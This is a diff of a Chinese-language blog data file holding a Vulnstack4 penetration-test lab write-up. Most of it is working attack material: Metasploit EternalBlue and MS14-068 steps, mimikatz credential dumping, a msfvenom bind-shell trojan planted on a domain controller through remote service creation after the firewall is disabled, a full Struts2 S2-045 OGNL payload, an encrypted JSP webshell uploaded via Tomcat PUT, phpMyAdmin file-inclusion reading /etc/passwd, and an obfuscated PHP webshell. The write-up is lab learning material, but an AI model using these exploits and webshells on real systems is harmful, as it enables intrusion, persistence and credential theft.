+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718113156078.png" alt="image-20220718113156078"></p>
+<p>看到有192.168.183.0/24内网网段</p>
+<p>利用<code>scp</code>将fscan传到Ubuntu上，利用fscan对内网进行漏洞探针</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">scp /fscan hack@192.168.184.139:/tmp</span><br><span class="line"><span class="comment">## 密码：123456777</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line">chmod +x /tmp/fscan</span><br><span class="line">/tmp/fscan -h 192.168.183.0/24</span><br></pre></td></tr></table></figure>
+
+<p>fscan扫描结果如下</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718115340547.png" alt="image-20220718115340547"></p>
+<p>192.168.183.132这台windows7存在永恒之蓝，直接利用msf开打</p>
+<p>因为是内网主机，所以这里需要我们正向去打</p>
+<p>首先利用ssh在kali本地的1080端口开启一个动态代理</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -D 1080 hack@192.168.184.139</span><br><span class="line"><span class="comment"># 密码：123456777</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718115523769.png" alt="image-20220718115523769"></p>
+<p>之后利用msf去打，这里有两点要注意，一是要设置正向payload，二是要设置一个全局变量proxies</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">search eternalblue</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp  # 正向连接的payload</span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">132</span></span><br><span class="line">setg proxies socks5:<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">1080</span>  # setg是设置全局变量的意思，这里设置代理才能访问到内网主机</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>获取到win7的shell，并且获取到system权限</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718120048139.png" alt="image-20220718120048139"></p>
+<p>这里拿到shell去翻桌面看看时，发现有MS14-068.exe，靶场作者已经明示让我用这个洞去打与空了</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718120749389.png" alt="image-20220718120749389"></p>
+<p>这里其实还可以通过<code>systeminfo</code>命令看打了哪些补丁来看存在什么漏洞</p>
+<p>好，明确了目标，用MS14-068来打域控，这时还差域用户名，域名，域用户sid，域控地址以及密码</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718121846579.png" alt="image-20220718121846579"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 这里域用户名，域名，域控地址都可以很快得到</span><br><span class="line">域用户名：douser</span><br><span class="line">域名：demo.com</span><br><span class="line">域控地址：<span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br></pre></td></tr></table></figure>
+
+<p>要获得sid需要切换到域用户权限，获得密码要借助mimikatz(靶机上本来就有一个)</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 没切换用户前，当前为system，看不到域用户的sid</span><br><span class="line">whoami /all</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718123117476.png" alt="image-20220718123117476"></p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718123126631.png" alt="image-20220718123126631"></p>
+<p>这里就需要窃取域用户的令牌，降权到域用户身份，才能读到域用户sid</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># msf的meterpreter</span><br><span class="line">ps</span><br><span class="line">steal_token <span class="number">2552</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718123340564.png" alt="image-20220718123340564"></p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718123502861.png" alt="image-20220718123502861"></p>
+<p>得到demo\douser用户的sid<code>S-1-5-21-979886063-1111900045-1414766810-1107</code></p>
+<p>然后我们在meterpreter处使用命令<code>rev2self</code>移除令牌，回到system权限，用mimikatz读取密码</p>
+<p>此处有个坑，我用ms17_010获得的system权限在运行mimikatz的时候回报错：</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718124306186.png" alt="image-20220718124306186"></p>
+<p>查找网上wp说模拟一个目标机上的system的令牌就可以，但我也没有成功</p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">load</span> Incognito</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后看白日梦组长的视频，使用msf中meterpreter的kiwi模块</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">load kiwi</span></span><br><span class="line"><span class="attribute">creds_all</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718124936180.png" alt="image-20220718124936180"></p>
+<p>得到douser的密码<code>Dotest123</code></p>
+<p>接下来就利用MS14-068来生成票据</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ms14-<span class="number">068</span> -u douser@demo.com -p Dotest123 -s S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">979886063</span>-<span class="number">1111900045</span>-<span class="number">1414766810</span>-<span class="number">1107</span> -d <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718125446698.png" alt="image-20220718125446698"></p>
+<p>然后利用mimikatz的kerberos::ptc进行票据传递</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz</span><br><span class="line"><span class="function">kerberos::<span class="title">ptc</span> <span class="title">TGT_douser</span>@<span class="title">demo.com.ccache</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718125636062.png" alt="image-20220718125636062"></p>
+<p>然后就拿下域控了</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 注意这里必须用主机名称才能访问，用ip不得行</span><br><span class="line"><span class="built_in">dir</span> \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718125946996.png" alt="image-20220718125946996"></p>
+<p>进一步攻击域控获取域控密码等</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># win7</span><br><span class="line">## 用<span class="built_in">net</span> use和域控建立连接</span><br><span class="line"><span class="built_in">net</span> use \\WIN-ENS2VR5TR3N</span><br><span class="line"></span><br><span class="line"># kali</span><br><span class="line">## kali创建正向连接木马(默认开启<span class="number">4444</span>监听)</span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp -f exe -o bind.exe</span><br><span class="line"></span><br><span class="line">## 利用msf的meterpreter的upload将bind.exe上传到win7</span><br><span class="line">upload /bind.exe c:\\users\\douser\\desktop\\bind.exe</span><br><span class="line"></span><br><span class="line">## msf开启监听(另外启一个)</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">setg proxies socks5:<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">1080</span></span><br><span class="line"><span class="built_in">set</span> AutoRunScript post/windows/manage/migrate  # 自动迁移进程</span><br><span class="line"></span><br><span class="line">#win7</span><br><span class="line">## 然后通过win7将bind.exe传到域控上(WIN-ENS2VR5TR3N)</span><br><span class="line"><span class="built_in">copy</span> c:\Users\douser\Desktop\bind.exe \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"></span><br><span class="line">## 通过远程在域控上面设置好计划任务(但是提示Access is denied)</span><br><span class="line">schtasks /create /tn &quot;test&quot; /tr C:\windows\system32\bind.exe /sc MINUTE /S <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br><span class="line"></span><br><span class="line">## 我们用sc服务来远程执行，先关闭防火墙</span><br><span class="line">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall <span class="built_in">set</span> allprofiles state off&quot;</span><br><span class="line">sc \\WIN-ENS2VR5TR3N <span class="built_in">start</span> unablefirewall</span><br><span class="line"></span><br><span class="line">## 创建服务执行msf马</span><br><span class="line">sc \\WIN-ENS2VR5TR3N create bindshell binpath= &quot;c:\bind.exe&quot;</span><br><span class="line">sc \\WIN-ENS2VR5TR3N <span class="built_in">start</span> bindshell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718144354407.png" alt="image-20220718144354407"></p>
+<p>运行完木马后msf收到shell</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718144727846.png" alt="image-20220718144727846"></p>
+<p>接下来抓取密码</p>
+<p>通过meterpreter的upload将mimikatz传上去</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">upload /mimikatz.exe c:\mimikatz.exe</span><br><span class="line"><span class="built_in">cd</span> c:\</span><br><span class="line">mimikatz</span><br><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718150112535.png" alt="image-20220718150112535"></p>
+<p>得到明文密码：<code>Test2022</code></p>
+<p>有了明文密码，接下来登录远程桌面</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 利用meterpreter把远程桌面开启</span><br><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718150403954.png" alt="image-20220718150403954"></p>
+<p>然后上代理远程登陆</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">proxychains4 rdesktop <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718150657246.png" alt="image-20220718150657246"></p>
+<p>到此结束</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[<a href="https://www.bilibili.com/video/BV19r4y1y7Nk?spm_id_from=333.337.search-card.all.click&vd_source=fb474708f246c21e5933eeb76372688d">网络安全/域渗透]内网安全入门靶场 vulnstack4攻略</a></p>
+<p><a href="https://www.freebuf.com/articles/network/244704.html">记一次Vulnstack靶场内网渗透（二）</a></p>
+<p><a href="https://xz.aliyun.com/t/6511">一句话木马踩坑记</a></p>
+<p><a href="http://c.biancheng.net/view/839.html">Linux /etc/passwd内容解释</a></p>
+<p><a href="http://c.biancheng.net/view/840.html">Linux /etc/shadow（影子文件）内容解析</a></p>
+<p><a href="https://www.runoob.com/w3cnote/set-ssh-login-key.html">设置 SSH 通过密钥登录 </a></p>
+]]></content>
+      <categories>
+        <category>内网安全</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>内网安全，vulnstack</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Vulnstack3靶场内网渗透</title>
     <url>/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>需要添加一张192.168.93.0/24网段的内网网卡</p>
@@ -586,235 +815,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Vulnstack4靶场内网渗透</title>
-    <url>/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
-<p><strong>机器密码</strong></p>
-<ul>
-<li><strong>web(Ubuntu)：</strong>ubuntu:ubuntu</li>
-<li><strong>域成员账号：</strong>douser:Dotest123</li>
-<li><strong>域管账号：</strong>administrator:Test2022</li>
-</ul>
-<p>这里域管密码我改了，因为原来的密码过期了，后面mimikatz抓不到密码</p>
-</blockquote>
-<p>需要添加一张192.168.183.0/24网段的内网网卡</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716114734710.png" alt="image-20220716114734710"></p>
-<p>若是kali用的Nat模式这里不要勾选“将主机虚拟适配器连接到此网络”，若是桥接模式则勾选</p>
-<p>ubuntu这台web服务器利用docker开启web服务</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 启动docke容器</span><br><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-<span class="number">045</span></span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/tomcat/CVE-<span class="number">2017</span>-<span class="number">12615</span>/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-<span class="number">2018</span>-<span class="number">12613</span>/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line"># 查看运行的docker容器</span><br><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure>
-
-
-
-<p>win7总是自动挂起</p>
-<p>进入控制面板 → 硬件和声音 → 更改计算机休眠时间 （改为从不休眠）</p>
-<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220719110838382.png" alt="image-20220719110838382"></p>
-<h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><p>老样子先用nmap对192.168.184.0/24网段进行端口扫描<code>nmap -sV 192.168.184.0/24</code></p>
-<p>在192.168.184.139这台主机发现三个web服务</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716164723466.png" alt="image-20220716164723466"></p>
-<p>接下来来对这三个服务一次访问并通过这三个web服务不同路径获取该外网主机权限</p>
-<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><h4 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># EXP抓上传的包，修改Content-<span class="built_in">Type</span>的值</span><br><span class="line">POST / HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="function">Host: 192.168.184.139:2001</span></span><br><span class="line"><span class="function"><span class="title">User</span>-<span class="title">Agent</span>: <span class="title">Mozilla</span>/5.0 (<span class="title">Windows</span> <span class="title">NT</span> 10.0; <span class="title">Win64</span>; <span class="title">x64</span>; <span class="title">rv</span>:100.0) <span class="title">Gecko</span>/20100101 <span class="title">Firefox</span>/100.0</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>: <span class="title">text</span>/<span class="title">html</span>,<span class="title">application</span>/<span class="title">xhtml</span>+<span class="title">xml</span>,<span class="title">application</span>/<span class="title">xml</span>;<span class="title">q</span>=0.9,<span class="title">image</span>/<span class="title">avif</span>,<span class="title">image</span>/<span class="title">webp</span>,*/*;<span class="title">q</span>=0.8</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Language</span>: <span class="title">zh</span>-<span class="title">CN</span>,<span class="title">zh</span>;<span class="title">q</span>=0.8,<span class="title">zh</span>-<span class="title">TW</span>;<span class="title">q</span>=0.7,<span class="title">zh</span>-<span class="title">HK</span>;<span class="title">q</span>=0.5,<span class="title">en</span>-<span class="title">US</span>;<span class="title">q</span>=0.3,<span class="title">en</span>;<span class="title">q</span>=0.2</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Encoding</span>: <span class="title">gzip</span>, <span class="title">deflate</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: &quot;%&#123;(#<span class="title">nike</span>=&#x27;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&#x27;).(#<span class="title">dm</span>=@<span class="title">ognl.OgnlContext</span>@<span class="title">DEFAULT_MEMBER_ACCESS</span>).(#<span class="title">_memberAccess</span>?(#<span class="title">_memberAccess</span>=#<span class="title">dm</span>):((#<span class="title">container</span>=#<span class="title">context</span>[&#x27;<span class="title">com.opensymphony.xwork2.ActionContext.container</span>&#x27;]).(#<span class="title">ognlUtil</span>=#<span class="title">container.getInstance</span>(@<span class="title">com.opensymphony.xwork2.ognl.OgnlUtil</span>@<span class="title">class</span>)).(#<span class="title">ognlUtil.getExcludedPackageNames</span>().<span class="title">clear</span>()).(#<span class="title">ognlUtil.getExcludedClasses</span>().<span class="title">clear</span>()).(#<span class="title">context.setMemberAccess</span>(#<span class="title">dm</span>)))).(#<span class="title">cmd</span>=&#x27;<span class="title">whoami</span>&#x27;).(#<span class="title">iswin</span>=(@<span class="title">java.lang.System</span>@<span class="title">getProperty</span>(&#x27;<span class="title">os.name</span>&#x27;).<span class="title">toLowerCase</span>().<span class="title">contains</span>(&#x27;<span class="title">win</span>&#x27;))).(#<span class="title">cmds</span>=(#<span class="title">iswin</span>?&#123;&#x27;<span class="title">cmd.exe</span>&#x27;,&#x27;/<span class="title">c</span>&#x27;,#<span class="title">cmd</span>&#125;:&#123;&#x27;/<span class="title">bin</span>/<span class="title">bash</span>&#x27;,&#x27;-<span class="title">c</span>&#x27;,#<span class="title">cmd</span>&#125;)).(#<span class="title">p</span>=<span class="title">new</span> <span class="title">java.lang.ProcessBuilder</span>(#<span class="title">cmds</span>)).(#<span class="title">p.redirectErrorStream</span>(<span class="title">true</span>)).(#<span class="title">process</span>=#<span class="title">p.start</span>()).(#<span class="title">ros</span>=(@<span class="title">org.apache.struts2.ServletActionContext</span>@<span class="title">getResponse</span>().<span class="title">getOutputStream</span>())).(@<span class="title">org.apache.commons.io.IOUtils</span>@<span class="title">copy</span>(#<span class="title">process.getInputStream</span>(),#<span class="title">ros</span>)).(#<span class="title">ros.flush</span>())&#125;&quot;</span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Length</span>: 0</span></span><br><span class="line"><span class="function"><span class="title">Origin</span>: <span class="title">http</span>://192.168.184.139:2001</span></span><br><span class="line"><span class="function"><span class="title">Connection</span>: <span class="title">close</span></span></span><br><span class="line"><span class="function"><span class="title">Referer</span>: <span class="title">http</span>://192.168.184.139:2001/<span class="title">doUpload.action</span></span></span><br><span class="line"><span class="function"><span class="title">Cookie</span>: <span class="title">JSESSIONID</span>=1<span class="title">d6q15kddtb1z136edkhjwibnl</span>; <span class="title">phpMyAdmin</span>=4<span class="title">faf82614b1631c025eb550defea0d14</span>; <span class="title">pma_lang</span>=<span class="title">zh_CN</span></span></span><br><span class="line"><span class="function"><span class="title">Upgrade</span>-<span class="title">Insecure</span>-<span class="title">Requests</span>: 1</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716172351451.png" alt="image-20220716172351451"></p>
-<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>留坑</p>
-<h4 id="tomcat-PUT上传-CVE-2017-12615"><a href="#tomcat-PUT上传-CVE-2017-12615" class="headerlink" title="tomcat PUT上传(CVE-2017-12615)"></a>tomcat PUT上传(CVE-2017-12615)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># EXP</span><br><span class="line">PUT /tomcat.jsp/ HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="function">Host: <span class="title">your</span>-<span class="title">ip</span>:8080</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>: */*</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Language</span>: <span class="title">en</span></span></span><br><span class="line"><span class="function"><span class="title">User</span>-<span class="title">Agent</span>: <span class="title">Mozilla</span>/5.0 (<span class="title">compatible</span>; <span class="title">MSIE</span> 9.0; <span class="title">Windows</span> <span class="title">NT</span> 6.1; <span class="title">Win64</span>; <span class="title">x64</span>; <span class="title">Trident</span>/5.0)</span></span><br><span class="line"><span class="function"><span class="title">Connection</span>: <span class="title">close</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: <span class="title">application</span>/<span class="title">x</span>-<span class="title">www</span>-<span class="title">form</span>-<span class="title">urlencoded</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Length</span>: 572</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;%@<span class="title">page</span> <span class="title">import</span>=&quot;<span class="title">java.util</span>.*,<span class="title">javax.crypto</span>.*,<span class="title">javax.crypto.spec</span>.*&quot;%&gt;&lt;%!<span class="title">class</span> <span class="title">U</span> <span class="title">extends</span> <span class="title">ClassLoader</span>&#123;<span class="title">U</span>(<span class="title">ClassLoader</span> <span class="title">c</span>)&#123;<span class="title">super</span>(<span class="title">c</span>);&#125;<span class="title">public</span> <span class="title">Class</span> <span class="title">g</span>(<span class="title">byte</span> []<span class="title">b</span>)&#123;<span class="title">return</span> <span class="title">super.defineClass</span>(<span class="title">b</span>,0,<span class="title">b.length</span>);&#125;&#125;%&gt;&lt;%<span class="title">if</span> (<span class="title">request.getMethod</span>().<span class="title">equals</span>(&quot;<span class="title">POST</span>&quot;))&#123;<span class="title">String</span> <span class="title">k</span>=&quot;<span class="title">e45e329feb5d925b</span>&quot;;/*åÆ¥:Þ¥Æ32<span class="title">Mmd5</span>&lt;<span class="title">M16M</span>Ø¤Þ¥Æ<span class="title">rebeyond</span>*/<span class="title">session.putValue</span>(&quot;<span class="title">u</span>&quot;,<span class="title">k</span>);<span class="title">Cipher</span> <span class="title">c</span>=<span class="title">Cipher.getInstance</span>(&quot;<span class="title">AES</span>&quot;);<span class="title">c.init</span>(2,<span class="title">new</span> <span class="title">SecretKeySpec</span>(<span class="title">k.getBytes</span>(),&quot;<span class="title">AES</span>&quot;));<span class="title">new</span> <span class="title">U</span>(<span class="title">this.getClass</span>().<span class="title">getClassLoader</span>()).<span class="title">g</span>(<span class="title">c.doFinal</span>(<span class="title">new</span> <span class="title">sun.misc.BASE64Decoder</span>().<span class="title">decodeBuffer</span>(<span class="title">request.getReader</span>().<span class="title">readLine</span>()))).<span class="title">newInstance</span>().<span class="title">equals</span>(<span class="title">pageContext</span>);&#125;%&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716173303485.png" alt="image-20220716173303485"></p>
-<h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>留坑</p>
-<h4 id="phpmyadmin文件包含-CVE-2018-12613"><a href="#phpmyadmin文件包含-CVE-2018-12613" class="headerlink" title="phpmyadmin文件包含(CVE-2018-12613)"></a>phpmyadmin文件包含(CVE-2018-12613)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># POC</span><br><span class="line"><span class="function">http://192.168.184.139:2003//<span class="title">index.php</span>?<span class="title">target</span>=<span class="title">db_sql.php</span>%253<span class="title">f</span>/../../../../../../../../<span class="title">etc</span>/<span class="title">passwd</span></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716205700320.png" alt="image-20220716205700320"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># EXP</span><br><span class="line"># 在http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">139</span>:<span class="number">2003</span>/server_sql.php页面写入SELECT &quot;&lt;?=system(&#x27;whoami&#x27;);?&gt;&quot;</span><br><span class="line"># 会保存到/tmp/sess_[Cookie中phpMyadmin的值]</span><br><span class="line"># Payload如下</span><br><span class="line"><span class="function">http://192.168.184.139:2003/<span class="title">index.php</span>?<span class="title">target</span>=<span class="title">db_sql.php</span>%253<span class="title">f</span>/../../../../../../../<span class="title">tmp</span>/<span class="title">sess_2b513185c9f040cae084bc2d6b5f79a9</span></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716210209265.png" alt="image-20220716210209265"></p>
-<p>上面勉强用system()函数命令执行成功，但我还是想让蚁剑能连上，于是有了接下来的一番折腾</p>
-<p>由于我最开始尝试直接传<code>&lt;?php eval($_POST[cmd]);?&gt;</code>，但并没有成功连上蚁剑，怀疑可能是被杀了吧</p>
-<p>接着尝试<code>&lt;?php assert($_POST[cmd]);?&gt;</code>，这回直接报错</p>
-<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717122731632.png" alt="image-20220717122731632"></p>
-<p>在查了网上资料后结论是，PHP7.0及之前的版本都可以执行，但是之后的版本就<strong>不允许</strong>在assert()函数中传入<strong>可变字符串</strong>了</p>
-<p>但我看到一篇文章<a href="https://www.freebuf.com/articles/network/244704.html">记一次Vulnstack靶场内网渗透（二） - FreeBuf网络安全行业门户</a>，这个作者就是用的assert成功连上蚁剑的，他用的免杀马如下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$p</span> = <span class="keyword">array</span>(<span class="string">&#x27;f&#x27;</span>=&gt;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;pffff&#x27;</span>=&gt;<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>=&gt;<span class="string">&#x27;fffff&#x27;</span>,<span class="string">&#x27;lfaaaa&#x27;</span>=&gt;<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;nnnnn&#x27;</span>=&gt;<span class="string">&#x27;t&#x27;</span>);<span class="variable">$a</span> = array_keys(<span class="variable">$p</span>);<span class="variable">$_</span>=<span class="variable">$p</span>[<span class="string">&#x27;pffff&#x27;</span>].<span class="variable">$p</span>[<span class="string">&#x27;pffff&#x27;</span>].<span class="variable">$a</span>[<span class="number">2</span>];<span class="variable">$_</span>= <span class="string">&#x27;a&#x27;</span>.<span class="variable">$_</span>.<span class="string">&#x27;rt&#x27;</span>;<span class="variable">$_</span>(base64_decode(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;whoami&#x27;</span>]));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>我就纳闷他是怎么成功的，表示很不理解，现在只能把锅甩给docker环境有问题了</p>
-<p>并且我还在本地测了一下，用它的马我也没成功，但是改了一下把base64_decode删了，在蚁剑编码器选择base64就能连，我就觉得更加玄学了，并且我用我改的去测靶机还是没有成功，要哭辣</p>
-<p>这是这位作者的免杀给了我思路，之前eval没有成功，我能不能也像他一样做点混淆来绕过被杀</p>
